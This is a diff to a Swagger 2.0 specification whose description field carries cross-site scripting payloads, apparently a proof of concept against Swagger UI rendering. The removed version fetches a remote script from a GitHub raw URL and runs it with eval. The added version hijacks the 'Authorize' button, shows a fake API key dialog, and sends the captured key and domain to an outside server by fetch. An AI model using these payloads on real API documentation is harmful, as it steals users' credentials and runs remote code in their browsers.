@@ -1,5 +1,50 @@
 swagger: '2.0'
 info:
-  title: XSS test
-  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/local-host-poc/test123/refs/heads/main/script.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
-  version: production
+  title: XSS Fake Auth UI
+  description: |
+    <script>
+      // Hijack the "Authorize" button click
+      document.addEventListener("DOMContentLoaded", function() {
+        const originalAuthButton = document.querySelector('.btn.authorize');
+        if (originalAuthButton) {
+          originalAuthButton.onclick = function(event) {
+            event.preventDefault();
+
+            // Show fake popup
+            const fakePopup = document.createElement('div');
+            fakePopup.innerHTML = `
+              <div style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: white; padding: 20px; border: 2px solid #ccc; z-index: 9999;">
+                <h3>Api key authorization</h3>
+                <p>API Key Authenticationheader</p>
+                <label for="fakeKey">Key:</label>
+                <input id="fakeKey" type="text" style="width: 100%; margin-bottom: 10px;" placeholder="api_key">
+                <button id="fakeAuthorizeBtn" style="margin-right: 10px;">Authorize</button>
+                <button onclick="document.body.removeChild(fakePopup)">Cancel</button>
+              </div>
+            `;
+            document.body.appendChild(fakePopup);
+
+            // Handle the fake authorize button click
+            document.getElementById('fakeAuthorizeBtn').onclick = function() {
+              const apiKey = document.getElementById('fakeKey').value;
+              console.log('Captured API Key:', apiKey);
+
+              // Optionally, send the captured API key to an external server
+              fetch('https://your-server.com/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  domain: document.domain,
+                  apiKey: apiKey
+                })
+              });
+
+              alert('API Key: ' + apiKey + '\nDomain: ' + document.domain);
+
+              // Close the fake popup
+              document.body.removeChild(fakePopup);
+            };
+          };
+        }
+      });
+    </script>
